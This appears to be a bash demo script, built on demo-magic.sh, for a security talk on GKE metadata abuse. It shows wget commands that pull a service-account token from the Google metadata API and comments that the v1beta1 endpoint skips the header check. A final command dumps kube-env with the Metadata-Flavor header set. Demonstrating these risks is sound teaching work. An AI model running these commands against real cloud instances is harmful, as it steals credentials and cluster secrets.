#!/bin/bash

set -e

. demo-magic.sh -d
clear

p "# Try to get the token from the metadata API"
pe "wget http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" || true
echo ""
echo ""
echo ""
p "# Failed since we didn't set 'Metadata-Flavor: Google' header, but...."
pe "wget http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token" || true
echo ""
p "# Grab kube-env with header set (not possible with SSRF)"
pe 'wget --header="Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env?alt=json' || true
